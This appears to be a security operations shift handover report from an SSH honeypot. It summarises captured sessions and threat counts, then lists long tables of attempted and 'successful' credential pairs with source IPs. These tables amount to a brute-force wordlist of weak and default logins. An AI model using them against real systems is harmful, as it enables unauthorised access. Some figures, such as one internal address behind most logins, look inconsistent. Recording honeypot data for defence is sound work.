# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-15 |
| **Generated At** | 2026-07-15T13:51:35Z |
| **Shift Time** | 13:51 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **248** |
| Confirmed Threats | **212** |
| False Positives Filtered | **36** (14.5%) |
| Unique Attacker IPs | **129** |
| Countries of Origin | **30** |
| High Severity Cases | **118** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **130** |
| Malware Samples Analyzed | **3** HIGH · **34** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **395** |
| Unique Credential Pairs | **301** |
| Unique Usernames | **262** |
| Unique Passwords | **292** |
| Successful Auth Pairs | **361** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 45 |
| `user` | 19 |
| `admin` | 17 |
| `support` | 11 |
| `345gs5662d34` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |
| `support` | 7 |
| `admin` | 7 |
| `LeitboGi0ro` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `support` | `support` | 7 |
| `root` | `LeitboGi0ro` | 7 |
| `admin` | `admin` | 6 |
| `root` | `smo@@kkklss` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `starwars` | `10.0.0.73` | 2026-07-15T09:05:46 |
| `root` | `starwars` | `185.242.3.195` | 2026-07-15T09:08:53 |
| `user` | `user3` | `124.167.20.72` | 2026-07-15T09:11:39 |
| `nobody` | `1q2w3e4r` | `178.178.222.52` | 2026-07-15T09:14:46 |
| `nobody` | `1q2w3e4r` | `10.0.0.73` | 2026-07-15T09:15:15 |
| `user` | `user3` | `10.0.0.73` | 2026-07-15T09:15:29 |
| `unknown` | `unknown11` | `175.198.18.3` | 2026-07-15T09:18:04 |
| `unknown` | `unknown11` | `196.188.93.169` | 2026-07-15T09:18:17 |
| `unknown` | `unknown11` | `10.0.0.73` | 2026-07-15T09:18:25 |
| `ks` | `ks` | `190.244.39.224` | 2026-07-15T09:25:03 |
| `345gs5662d34` | `345gs5662d34` | `190.244.39.224` | 2026-07-15T09:25:06 |
| `ks` | `3245gs5662d34` | `190.244.39.224` | 2026-07-15T09:25:07 |
| `root` | `root@9876` | `120.52.18.119` | 2026-07-15T09:32:33 |
| `ubnt` | `ubnt1234` | `36.154.134.146` | 2026-07-15T09:37:21 |
| `ubnt` | `ubnt1234` | `121.159.71.249` | 2026-07-15T09:37:35 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `66.175.213.4` | 2026-07-15T09:39:01 |
| `admin` | `123qwe` | `10.0.0.73` | 2026-07-15T09:40:38 |
| `ubnt` | `ubnt1234` | `103.147.248.23` | 2026-07-15T09:41:03 |
| `tomcat` | `tomcat` | `218.59.235.170` | 2026-07-15T09:43:38 |
| `tomcat` | `tomcat` | `65.20.133.56` | 2026-07-15T09:43:47 |
| `tomcat` | `tomcat` | `10.0.0.73` | 2026-07-15T09:44:09 |
| `ubuntu` | `debian` | `185.242.3.195` | 2026-07-15T09:45:28 |
| `support` | `support` | `176.53.159.196` | 2026-07-15T09:45:33 |
| `support` | `support` | `10.0.0.73` | 2026-07-15T09:46:55 |
| `user` | `1` | `209.97.183.158` | 2026-07-15T09:47:53 |
| `user` | `123456` | `209.97.183.158` | 2026-07-15T09:50:20 |
| `pi` | `raspberryraspberry993311` | `125.227.156.55` | 2026-07-15T09:51:25 |
| `pi` | `raspberry` | `125.227.156.55` | 2026-07-15T09:51:25 |
| `sol` | `sol` | `209.97.183.158` | 2026-07-15T09:52:54 |
| `solana` | `solana` | `209.97.183.158` | 2026-07-15T09:55:34 |
| `admin` | `admin` | `43.153.206.227` | 2026-07-15T09:57:50 |
| `trader` | `trader` | `209.97.183.158` | 2026-07-15T09:58:06 |
| `ubuntu` | `debian` | `10.0.0.73` | 2026-07-15T09:59:36 |
| `trading` | `trading` | `209.97.183.158` | 2026-07-15T10:00:38 |
| `mysql` | `mysql` | `103.68.52.210` | 2026-07-15T10:03:19 |
| `mysql` | `mysql` | `14.23.77.27` | 2026-07-15T10:03:28 |
| `admin` | `admin2004` | `111.70.49.182` | 2026-07-15T10:03:52 |
| `admin` | `admin2004` | `82.65.140.218` | 2026-07-15T10:04:00 |
| `kubernetes` | `kubernetes` | `10.0.0.73` | 2026-07-15T10:04:19 |
| `docker` | `docker` | `10.0.0.73` | 2026-07-15T10:04:36 |
| `podman` | `podman` | `10.0.0.73` | 2026-07-15T10:04:54 |
| `containerd` | `containerd` | `10.0.0.73` | 2026-07-15T10:05:11 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-15T10:05:18 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-15T10:05:18 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-15T10:05:19 |
| `crio` | `crio` | `10.0.0.73` | 2026-07-15T10:05:28 |
| `rancher` | `rancher` | `10.0.0.73` | 2026-07-15T10:05:46 |
| `openshift` | `openshift` | `10.0.0.73` | 2026-07-15T10:06:05 |
| `nomad` | `nomad` | `10.0.0.73` | 2026-07-15T10:06:25 |
| `helm` | `helm` | `10.0.0.73` | 2026-07-15T10:06:44 |
| `admin` | `22` | `45.55.133.80` | 2026-07-15T10:07:01 |
| `kustomize` | `kustomize` | `10.0.0.73` | 2026-07-15T10:07:05 |
| `admin` | `22` | `180.248.52.247` | 2026-07-15T10:07:17 |
| `buildah` | `buildah` | `10.0.0.73` | 2026-07-15T10:07:25 |
| `skopeo` | `skopeo` | `10.0.0.73` | 2026-07-15T10:07:45 |
| `k3s` | `k3s` | `10.0.0.73` | 2026-07-15T10:08:04 |
| `k3d` | `k3d` | `10.0.0.73` | 2026-07-15T10:08:24 |
| `kind` | `kind` | `10.0.0.73` | 2026-07-15T10:08:44 |
| `minikube` | `minikube` | `10.0.0.73` | 2026-07-15T10:09:03 |
| `microk8s` | `microk8s` | `10.0.0.73` | 2026-07-15T10:09:23 |
| `k0s` | `k0s` | `10.0.0.73` | 2026-07-15T10:09:43 |
| `kubespray` | `kubespray` | `10.0.0.73` | 2026-07-15T10:10:02 |
| `portainer` | `portainer` | `10.0.0.73` | 2026-07-15T10:10:21 |
| `lens` | `lens` | `10.0.0.73` | 2026-07-15T10:10:40 |
| `admin` | `22` | `10.0.0.73` | 2026-07-15T10:10:59 |
| `k9s` | `k9s` | `10.0.0.73` | 2026-07-15T10:11:00 |
| `test` | `test@123` | `61.76.38.54` | 2026-07-15T10:11:03 |
| `345gs5662d34` | `345gs5662d34` | `61.76.38.54` | 2026-07-15T10:11:07 |
| `test` | `3245gs5662d34` | `61.76.38.54` | 2026-07-15T10:11:08 |
| `kubeflow` | `kubeflow` | `10.0.0.73` | 2026-07-15T10:11:19 |
| `knative` | `knative` | `10.0.0.73` | 2026-07-15T10:11:38 |
| `kubevirt` | `kubevirt` | `10.0.0.73` | 2026-07-15T10:11:57 |
| `longhorn` | `longhorn` | `10.0.0.73` | 2026-07-15T10:12:16 |
| `calico` | `calico` | `10.0.0.73` | 2026-07-15T10:12:36 |
| `cilium` | `cilium` | `10.0.0.73` | 2026-07-15T10:12:56 |
| `flannel` | `flannel` | `10.0.0.73` | 2026-07-15T10:13:15 |
| `metallb` | `metallb` | `10.0.0.73` | 2026-07-15T10:13:35 |
| `keda` | `keda` | `10.0.0.73` | 2026-07-15T10:13:55 |
| `velero` | `velero` | `10.0.0.73` | 2026-07-15T10:14:15 |
| `jenkins` | `jenkins` | `10.0.0.73` | 2026-07-15T10:14:35 |
| `gitlab` | `gitlab` | `10.0.0.73` | 2026-07-15T10:14:55 |
| `drone` | `drone` | `10.0.0.73` | 2026-07-15T10:15:15 |
| `teamcity` | `teamcity` | `10.0.0.73` | 2026-07-15T10:15:36 |
| `bamboo` | `bamboo` | `10.0.0.73` | 2026-07-15T10:15:56 |
| `circleci` | `circleci` | `10.0.0.73` | 2026-07-15T10:16:16 |
| `tekton` | `tekton` | `10.0.0.73` | 2026-07-15T10:16:36 |
| `argocd` | `argocd` | `10.0.0.73` | 2026-07-15T10:16:55 |
| `flux` | `flux` | `10.0.0.73` | 2026-07-15T10:17:15 |
| `spinnaker` | `spinnaker` | `10.0.0.73` | 2026-07-15T10:17:34 |
| `concourse` | `concourse` | `10.0.0.73` | 2026-07-15T10:17:54 |
| `buildkite` | `buildkite` | `10.0.0.73` | 2026-07-15T10:18:14 |
| `woodpecker` | `woodpecker` | `10.0.0.73` | 2026-07-15T10:18:34 |
| `codefresh` | `codefresh` | `10.0.0.73` | 2026-07-15T10:18:53 |
| `skaffold` | `skaffold` | `10.0.0.73` | 2026-07-15T10:19:13 |
| `dagger` | `dagger` | `10.0.0.73` | 2026-07-15T10:19:33 |
| `terraform` | `terraform` | `10.0.0.73` | 2026-07-15T10:19:54 |
| `opentofu` | `opentofu` | `10.0.0.73` | 2026-07-15T10:20:14 |
| `ansible` | `ansible` | `10.0.0.73` | 2026-07-15T10:20:34 |
| `puppet` | `puppet` | `10.0.0.73` | 2026-07-15T10:20:54 |
| `chef` | `chef` | `10.0.0.73` | 2026-07-15T10:21:15 |
| `saltstack` | `saltstack` | `10.0.0.73` | 2026-07-15T10:21:35 |
| `pulumi` | `pulumi` | `10.0.0.73` | 2026-07-15T10:21:54 |
| `packer` | `packer` | `10.0.0.73` | 2026-07-15T10:22:14 |
| `vagrant` | `vagrant` | `10.0.0.73` | 2026-07-15T10:22:34 |
| `crossplane` | `crossplane` | `10.0.0.73` | 2026-07-15T10:22:54 |
| `cfengine` | `cfengine` | `10.0.0.73` | 2026-07-15T10:23:14 |
| `rundeck` | `rundeck` | `10.0.0.73` | 2026-07-15T10:23:33 |
| `foreman` | `foreman` | `10.0.0.73` | 2026-07-15T10:23:53 |
| `cobbler` | `cobbler` | `10.0.0.73` | 2026-07-15T10:24:12 |
| `maas` | `maas` | `10.0.0.73` | 2026-07-15T10:24:32 |
| `vault` | `vault` | `10.0.0.73` | 2026-07-15T10:24:52 |
| `consul` | `consul` | `10.0.0.73` | 2026-07-15T10:25:12 |
| `etcd` | `etcd` | `10.0.0.73` | 2026-07-15T10:25:32 |
| `zookeeper` | `zookeeper` | `10.0.0.73` | 2026-07-15T10:25:53 |
| `sops` | `sops` | `10.0.0.73` | 2026-07-15T10:26:13 |
| `certmanager` | `certmanager` | `10.0.0.73` | 2026-07-15T10:26:35 |
| `certbot` | `certbot` | `10.0.0.73` | 2026-07-15T10:26:55 |
| `infisical` | `infisical` | `10.0.0.73` | 2026-07-15T10:27:16 |
| `nginx` | `nginx` | `10.0.0.73` | 2026-07-15T10:27:36 |
| `apache` | `apache` | `10.0.0.73` | 2026-07-15T10:27:57 |
| `caddy` | `caddy` | `10.0.0.73` | 2026-07-15T10:28:33 |
| `lighttpd` | `lighttpd` | `10.0.0.73` | 2026-07-15T10:29:18 |
| `postgres` | `root` | `220.180.249.165` | 2026-07-15T10:29:35 |
| `traefik` | `traefik` | `10.0.0.73` | 2026-07-15T10:30:03 |
| `haproxy` | `haproxy` | `10.0.0.73` | 2026-07-15T10:30:48 |
| `envoy` | `envoy` | `10.0.0.73` | 2026-07-15T10:31:34 |
| `varnish` | `varnish` | `10.0.0.73` | 2026-07-15T10:32:20 |
| `user` | `uploader` | `222.76.248.54` | 2026-07-15T10:32:51 |
| `squid` | `squid` | `10.0.0.73` | 2026-07-15T10:33:05 |
| `postgres` | `root` | `36.64.211.93` | 2026-07-15T10:33:15 |
| `postgres` | `root` | `186.235.193.170` | 2026-07-15T10:33:28 |
| `openresty` | `openresty` | `10.0.0.73` | 2026-07-15T10:33:50 |
| `keepalived` | `keepalived` | `10.0.0.73` | 2026-07-15T10:34:35 |
| `kong` | `kong` | `10.0.0.73` | 2026-07-15T10:35:20 |
| `apisix` | `apisix` | `10.0.0.73` | 2026-07-15T10:36:05 |
| `user` | `uploader` | `10.0.0.73` | 2026-07-15T10:36:49 |
| `tyk` | `tyk` | `10.0.0.73` | 2026-07-15T10:36:50 |
| `gloo` | `gloo` | `10.0.0.73` | 2026-07-15T10:37:35 |
| `contour` | `contour` | `10.0.0.73` | 2026-07-15T10:38:21 |
| `root` | `PaSsW0Rd` | `185.242.3.195` | 2026-07-15T10:38:37 |
| `user3` | `test` | `160.22.170.237` | 2026-07-15T10:39:02 |
| `krakend` | `krakend` | `10.0.0.73` | 2026-07-15T10:39:06 |
| `345gs5662d34` | `345gs5662d34` | `160.22.170.237` | 2026-07-15T10:39:07 |
| `user3` | `3245gs5662d34` | `160.22.170.237` | 2026-07-15T10:39:09 |
| `postgresql` | `postgresql` | `10.0.0.73` | 2026-07-15T10:39:51 |
| `mysql` | `mysql` | `10.0.0.73` | 2026-07-15T10:40:37 |
| `mariadb` | `mariadb` | `10.0.0.73` | 2026-07-15T10:41:22 |
| `sqlite` | `sqlite` | `10.0.0.73` | 2026-07-15T10:42:07 |
| `percona` | `percona` | `10.0.0.73` | 2026-07-15T10:42:53 |
| `cockroachdb` | `cockroachdb` | `10.0.0.73` | 2026-07-15T10:43:38 |
| `yugabytedb` | `yugabytedb` | `10.0.0.73` | 2026-07-15T10:44:25 |
| `tidb` | `tidb` | `10.0.0.73` | 2026-07-15T10:45:10 |
| `greenplum` | `greenplum` | `10.0.0.73` | 2026-07-15T10:45:56 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-15T10:46:10 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-15T10:46:11 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-15T10:46:12 |
| `firebird` | `firebird` | `10.0.0.73` | 2026-07-15T10:46:42 |
| `root` | `Password123$` | `163.7.3.26` | 2026-07-15T10:46:55 |
| `345gs5662d34` | `345gs5662d34` | `163.7.3.26` | 2026-07-15T10:47:00 |
| `root` | `3245gs5662d34` | `163.7.3.26` | 2026-07-15T10:47:09 |
| `root` | `LeitboGi0ro` | `146.56.164.20` | 2026-07-15T10:47:22 |
| `root` | `123@@@` | `146.56.164.20` | 2026-07-15T10:47:22 |
| `citus` | `citus` | `10.0.0.73` | 2026-07-15T10:47:27 |
| `duckdb` | `duckdb` | `10.0.0.73` | 2026-07-15T10:48:13 |
| `mongodb` | `mongodb` | `10.0.0.73` | 2026-07-15T10:48:58 |
| `redis` | `redis` | `10.0.0.73` | 2026-07-15T10:49:44 |
| `cassandra` | `cassandra` | `10.0.0.73` | 2026-07-15T10:50:29 |
| `couchdb` | `couchdb` | `10.0.0.73` | 2026-07-15T10:51:15 |
| `brad` | `brad` | `121.142.87.218` | 2026-07-15T10:51:21 |
| `345gs5662d34` | `345gs5662d34` | `121.142.87.218` | 2026-07-15T10:51:25 |
| `brad` | `3245gs5662d34` | `121.142.87.218` | 2026-07-15T10:51:26 |
| `couchbase` | `couchbase` | `10.0.0.73` | 2026-07-15T10:52:01 |
| `root` | `PaSsW0Rd` | `10.0.0.73` | 2026-07-15T10:52:36 |
| `scylladb` | `scylladb` | `10.0.0.73` | 2026-07-15T10:52:47 |
| `rethinkdb` | `rethinkdb` | `10.0.0.73` | 2026-07-15T10:53:33 |
| `arangodb` | `arangodb` | `10.0.0.73` | 2026-07-15T10:54:19 |
| `ravendb` | `ravendb` | `10.0.0.73` | 2026-07-15T10:55:04 |
| `aerospike` | `aerospike` | `10.0.0.73` | 2026-07-15T10:55:50 |
| `hbase` | `hbase` | `10.0.0.73` | 2026-07-15T10:56:36 |
| `riak` | `riak` | `10.0.0.73` | 2026-07-15T10:57:22 |
| `tarantool` | `tarantool` | `10.0.0.73` | 2026-07-15T10:58:08 |
| `keydb` | `keydb` | `10.0.0.73` | 2026-07-15T10:58:54 |
| `root` | `qwe123` | `111.70.32.49` | 2026-07-15T10:59:27 |
| `root` | `123123` | `49.206.194.29` | 2026-07-15T10:59:32 |
| `admin` | `1234512345` | `117.222.52.177` | 2026-07-15T10:59:35 |
| `root` | `qwe123` | `60.249.251.88` | 2026-07-15T10:59:40 |
| `valkey` | `valkey` | `10.0.0.73` | 2026-07-15T10:59:40 |
| `root` | `123123` | `187.8.120.90` | 2026-07-15T10:59:42 |
| `admin` | `1234512345` | `207.219.221.101` | 2026-07-15T10:59:43 |
| `root` | `qwe123` | `10.0.0.73` | 2026-07-15T10:59:51 |
| `admin` | `1234512345` | `10.0.0.73` | 2026-07-15T10:59:59 |
| `memcached` | `memcached` | `10.0.0.73` | 2026-07-15T11:00:26 |
| `hazelcast` | `hazelcast` | `10.0.0.73` | 2026-07-15T11:01:12 |
| `root` | `kambing123` | `147.182.177.180` | 2026-07-15T11:01:52 |
| `345gs5662d34` | `345gs5662d34` | `147.182.177.180` | 2026-07-15T11:01:54 |
| `root` | `3245gs5662d34` | `147.182.177.180` | 2026-07-15T11:01:54 |
| `ignite` | `ignite` | `10.0.0.73` | 2026-07-15T11:01:58 |
| `surrealdb` | `surrealdb` | `10.0.0.73` | 2026-07-15T11:02:44 |
| `root` | `123123` | `116.7.248.50` | 2026-07-15T11:03:25 |
| `pocketbase` | `pocketbase` | `10.0.0.73` | 2026-07-15T11:03:30 |
| `root` | `123123` | `222.190.110.210` | 2026-07-15T11:03:35 |
| `root` | `123123` | `10.0.0.73` | 2026-07-15T11:03:50 |
| `elasticsearch` | `elasticsearch` | `10.0.0.73` | 2026-07-15T11:04:17 |
| `opensearch` | `opensearch` | `10.0.0.73` | 2026-07-15T11:05:04 |
| `solr` | `solr` | `10.0.0.73` | 2026-07-15T11:05:51 |
| `meilisearch` | `meilisearch` | `10.0.0.73` | 2026-07-15T11:06:38 |
| `typesense` | `typesense` | `10.0.0.73` | 2026-07-15T11:07:24 |
| `manticore` | `manticore` | `10.0.0.73` | 2026-07-15T11:08:11 |
| `vespa` | `vespa` | `10.0.0.73` | 2026-07-15T11:08:58 |
| `quickwit` | `quickwit` | `10.0.0.73` | 2026-07-15T11:09:45 |
| `zincsearch` | `zincsearch` | `10.0.0.73` | 2026-07-15T11:10:32 |
| `clickhouse` | `clickhouse` | `10.0.0.73` | 2026-07-15T11:11:19 |
| `druid` | `druid` | `10.0.0.73` | 2026-07-15T11:12:06 |
| `pinot` | `pinot` | `10.0.0.73` | 2026-07-15T11:12:54 |
| `doris` | `doris` | `10.0.0.73` | 2026-07-15T11:13:41 |
| `starrocks` | `starrocks` | `10.0.0.73` | 2026-07-15T11:14:27 |
| `root` | `password` | `91.92.40.176` | 2026-07-15T11:14:36 |
| `influxdb` | `influxdb` | `10.0.0.73` | 2026-07-15T11:15:14 |
| `root` | `admin` | `91.92.40.176` | 2026-07-15T11:15:33 |
| `timescaledb` | `timescaledb` | `10.0.0.73` | 2026-07-15T11:16:01 |
| `victoriametrics` | `victoriametrics` | `10.0.0.73` | 2026-07-15T11:16:48 |
| `questdb` | `questdb` | `10.0.0.73` | 2026-07-15T11:17:36 |
| `neo4j` | `neo4j` | `10.0.0.73` | 2026-07-15T11:18:24 |
| `dgraph` | `dgraph` | `10.0.0.73` | 2026-07-15T11:19:11 |
| `janusgraph` | `janusgraph` | `10.0.0.73` | 2026-07-15T11:19:59 |
| `nebula` | `nebula` | `10.0.0.73` | 2026-07-15T11:20:46 |
| `memgraph` | `memgraph` | `10.0.0.73` | 2026-07-15T11:21:34 |
| `milvus` | `milvus` | `10.0.0.73` | 2026-07-15T11:22:21 |
| `weaviate` | `weaviate` | `10.0.0.73` | 2026-07-15T11:23:09 |
| `qdrant` | `qdrant` | `10.0.0.73` | 2026-07-15T11:23:57 |
| `chroma` | `chroma` | `10.0.0.73` | 2026-07-15T11:24:45 |
| `centos` | `abc123` | `186.215.107.189` | 2026-07-15T11:25:11 |
| `centos` | `abc123` | `45.181.101.95` | 2026-07-15T11:25:19 |
| `pgvector` | `pgvector` | `10.0.0.73` | 2026-07-15T11:25:32 |
| `test` | `passw0rd` | `118.91.176.243` | 2026-07-15T11:26:00 |
| `kafka` | `kafka` | `10.0.0.73` | 2026-07-15T11:26:19 |
| `rabbitmq` | `rabbitmq` | `10.0.0.73` | 2026-07-15T11:27:07 |
| `activemq` | `activemq` | `10.0.0.73` | 2026-07-15T11:27:54 |
| `nats` | `nats` | `10.0.0.73` | 2026-07-15T11:28:41 |
| `test` | `passw0rd` | `58.22.255.28` | 2026-07-15T11:29:13 |
| `pulsar` | `pulsar` | `10.0.0.73` | 2026-07-15T11:29:29 |
| `redpanda` | `redpanda` | `10.0.0.73` | 2026-07-15T11:30:18 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-15T11:30:53 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-15T11:30:53 |
| `nsq` | `nsq` | `10.0.0.73` | 2026-07-15T11:31:06 |
| `root` | `qwe12345^` | `185.242.3.195` | 2026-07-15T11:31:42 |
| `zeromq` | `zeromq` | `10.0.0.73` | 2026-07-15T11:31:54 |
| `mosquitto` | `mosquitto` | `10.0.0.73` | 2026-07-15T11:32:41 |
| `emqx` | `emqx` | `10.0.0.73` | 2026-07-15T11:33:29 |
| `vernemq` | `vernemq` | `10.0.0.73` | 2026-07-15T11:34:18 |
| `rocketmq` | `rocketmq` | `10.0.0.73` | 2026-07-15T11:35:06 |
| `benthos` | `benthos` | `10.0.0.73` | 2026-07-15T11:35:55 |
| `beanstalkd` | `beanstalkd` | `10.0.0.73` | 2026-07-15T11:36:44 |
| `celery` | `celery` | `10.0.0.73` | 2026-07-15T11:37:33 |
| `sidekiq` | `sidekiq` | `10.0.0.73` | 2026-07-15T11:38:21 |
| `resque` | `resque` | `10.0.0.73` | 2026-07-15T11:39:09 |
| `bullmq` | `bullmq` | `10.0.0.73` | 2026-07-15T11:39:58 |
| `airflow` | `airflow` | `10.0.0.73` | 2026-07-15T11:40:46 |
| `prefect` | `prefect` | `10.0.0.73` | 2026-07-15T11:41:35 |
| `dagster` | `dagster` | `10.0.0.73` | 2026-07-15T11:42:23 |
| `luigi` | `luigi` | `10.0.0.73` | 2026-07-15T11:43:12 |
| `nifi` | `nifi` | `10.0.0.73` | 2026-07-15T11:44:02 |
| `dbt` | `dbt` | `10.0.0.73` | 2026-07-15T11:44:50 |
| `spark` | `spark` | `10.0.0.73` | 2026-07-15T11:45:39 |
| `root` | `qwe12345^` | `10.0.0.73` | 2026-07-15T11:45:40 |
| `flink` | `flink` | `10.0.0.73` | 2026-07-15T11:46:28 |
| `hadoop` | `hadoop` | `10.0.0.73` | 2026-07-15T11:47:17 |
| `hive` | `hive` | `10.0.0.73` | 2026-07-15T11:48:06 |
| `debian` | `1qaz2wsx` | `103.174.145.35` | 2026-07-15T11:48:14 |
| `presto` | `presto` | `10.0.0.73` | 2026-07-15T11:48:55 |
| `trino` | `trino` | `10.0.0.73` | 2026-07-15T11:49:45 |
| `storm` | `storm` | `10.0.0.73` | 2026-07-15T11:50:35 |
| `beam` | `beam` | `10.0.0.73` | 2026-07-15T11:51:24 |
| `debian` | `1qaz2wsx` | `64.72.74.162` | 2026-07-15T11:51:52 |
| `debian` | `1qaz2wsx` | `111.70.32.8` | 2026-07-15T11:52:01 |
| `debezium` | `debezium` | `10.0.0.73` | 2026-07-15T11:52:13 |
| `meltano` | `meltano` | `10.0.0.73` | 2026-07-15T11:53:02 |
| `airbyte` | `airbyte` | `10.0.0.73` | 2026-07-15T11:53:51 |
| `seatunnel` | `seatunnel` | `10.0.0.73` | 2026-07-15T11:54:40 |
| `jupyter` | `jupyter` | `10.0.0.73` | 2026-07-15T11:55:31 |
| `jupyterhub` | `jupyterhub` | `10.0.0.73` | 2026-07-15T11:56:20 |
| `debian` | `webmaster` | `10.0.0.73` | 2026-07-15T11:56:24 |
| `mlflow` | `mlflow` | `10.0.0.73` | 2026-07-15T11:57:09 |
| `root` | `*` | `103.61.122.229` | 2026-07-15T11:57:30 |
| `ray` | `ray` | `10.0.0.73` | 2026-07-15T11:57:58 |
| `dask` | `dask` | `10.0.0.73` | 2026-07-15T11:58:47 |
| `tensorflow` | `tensorflow` | `10.0.0.73` | 2026-07-15T11:59:37 |
| `pytorch` | `pytorch` | `10.0.0.73` | 2026-07-15T12:00:26 |
| `keras` | `keras` | `10.0.0.73` | 2026-07-15T12:01:16 |
| `scikit` | `scikit` | `10.0.0.73` | 2026-07-15T12:02:07 |
| `xgboost` | `xgboost` | `10.0.0.73` | 2026-07-15T12:02:56 |
| `ollama` | `ollama` | `10.0.0.73` | 2026-07-15T12:03:46 |
| `vllm` | `vllm` | `10.0.0.73` | 2026-07-15T12:04:36 |
| `triton` | `triton` | `10.0.0.73` | 2026-07-15T12:05:26 |
| `seldon` | `seldon` | `10.0.0.73` | 2026-07-15T12:06:16 |
| `bentoml` | `bentoml` | `10.0.0.73` | 2026-07-15T12:07:06 |
| `kserve` | `kserve` | `10.0.0.73` | 2026-07-15T12:07:56 |
| `feast` | `feast` | `10.0.0.73` | 2026-07-15T12:08:47 |
| `wandb` | `wandb` | `10.0.0.73` | 2026-07-15T12:09:37 |
| `clearml` | `clearml` | `10.0.0.73` | 2026-07-15T12:10:28 |
| `dvc` | `dvc` | `10.0.0.73` | 2026-07-15T12:11:18 |
| `langflow` | `langflow` | `10.0.0.73` | 2026-07-15T12:12:08 |
| `flowise` | `flowise` | `10.0.0.73` | 2026-07-15T12:12:58 |
| `litellm` | `litellm` | `10.0.0.73` | 2026-07-15T12:13:49 |
| `user` | `7777777777` | `31.41.81.65` | 2026-07-15T12:14:17 |
| `user` | `7777777777` | `61.145.163.164` | 2026-07-15T12:14:27 |
| `langfuse` | `langfuse` | `10.0.0.73` | 2026-07-15T12:14:40 |
| `user` | `ubuntu` | `90.173.78.90` | 2026-07-15T12:15:15 |
| `dify` | `dify` | `10.0.0.73` | 2026-07-15T12:15:31 |
| `user` | `ubuntu` | `10.0.0.73` | 2026-07-15T12:15:41 |
| `localai` | `localai` | `10.0.0.73` | 2026-07-15T12:16:21 |
| `prometheus` | `prometheus` | `10.0.0.73` | 2026-07-15T12:17:11 |
| `user` | `7777777777` | `89.203.142.96` | 2026-07-15T12:17:40 |
| `user` | `7777777777` | `70.89.116.5` | 2026-07-15T12:17:47 |
| `grafana` | `grafana` | `10.0.0.73` | 2026-07-15T12:18:01 |
| `user` | `7777777777` | `10.0.0.73` | 2026-07-15T12:18:02 |
| `user` | `159753` | `110.227.213.163` | 2026-07-15T12:18:20 |
| `zabbix` | `zabbix` | `10.0.0.73` | 2026-07-15T12:18:52 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-15T12:18:53 |
| `nagios` | `nagios` | `10.0.0.73` | 2026-07-15T12:19:42 |
| `icinga` | `icinga` | `10.0.0.73` | 2026-07-15T12:20:33 |
| `checkmk` | `checkmk` | `10.0.0.73` | 2026-07-15T12:21:24 |
| `netdata` | `netdata` | `10.0.0.73` | 2026-07-15T12:22:14 |
| `user` | `159753` | `10.0.0.73` | 2026-07-15T12:22:21 |
| `datadog` | `datadog` | `10.0.0.73` | 2026-07-15T12:23:05 |
| `newrelic` | `newrelic` | `10.0.0.73` | 2026-07-15T12:23:56 |
| `dynatrace` | `dynatrace` | `10.0.0.73` | 2026-07-15T12:24:46 |
| `telegraf` | `telegraf` | `10.0.0.73` | 2026-07-15T12:25:36 |
| `nagios` | `Nagios` | `185.242.3.195` | 2026-07-15T12:25:40 |
| `collectd` | `collectd` | `10.0.0.73` | 2026-07-15T12:26:27 |
| `statsd` | `statsd` | `10.0.0.73` | 2026-07-15T12:27:19 |
| `thanos` | `thanos` | `10.0.0.73` | 2026-07-15T12:28:10 |
| `cortex` | `cortex` | `10.0.0.73` | 2026-07-15T12:29:01 |
| `mimir` | `mimir` | `10.0.0.73` | 2026-07-15T12:29:52 |
| `munin` | `munin` | `10.0.0.73` | 2026-07-15T12:30:42 |
| `cacti` | `cacti` | `10.0.0.73` | 2026-07-15T12:31:33 |
| `root` | `---fuck_you----` | `120.26.195.212` | 2026-07-15T12:31:36 |
| `observium` | `observium` | `10.0.0.73` | 2026-07-15T12:32:24 |
| `librenms` | `librenms` | `10.0.0.73` | 2026-07-15T12:33:15 |
| `monit` | `monit` | `10.0.0.73` | 2026-07-15T12:34:06 |
| `glances` | `glances` | `10.0.0.73` | 2026-07-15T12:34:57 |
| `sensu` | `sensu` | `10.0.0.73` | 2026-07-15T12:35:48 |
| `opennms` | `opennms` | `10.0.0.73` | 2026-07-15T12:36:39 |
| `uptimekuma` | `uptimekuma` | `10.0.0.73` | 2026-07-15T12:37:30 |
| `devuser` | `devuserpass` | `64.186.241.50` | 2026-07-15T12:37:49 |
| `345gs5662d34` | `345gs5662d34` | `64.186.241.50` | 2026-07-15T12:37:51 |
| `devuser` | `3245gs5662d34` | `64.186.241.50` | 2026-07-15T12:37:51 |
| `gatus` | `gatus` | `10.0.0.73` | 2026-07-15T12:38:21 |
| `logstash` | `logstash` | `10.0.0.73` | 2026-07-15T12:39:12 |
| `nagios` | `Nagios` | `10.0.0.73` | 2026-07-15T12:39:48 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-15T12:40:00 |
| `support` | `support11` | `210.4.68.73` | 2026-07-15T12:41:05 |
| `support` | `support11` | `35.130.111.146` | 2026-07-15T12:41:12 |
| `support` | `support11` | `10.0.0.73` | 2026-07-15T12:41:28 |
| `max` | `max` | `122.170.111.140` | 2026-07-15T12:43:30 |
| `max` | `max` | `87.117.32.22` | 2026-07-15T12:43:38 |
| `max` | `max` | `10.0.0.73` | 2026-07-15T12:43:58 |
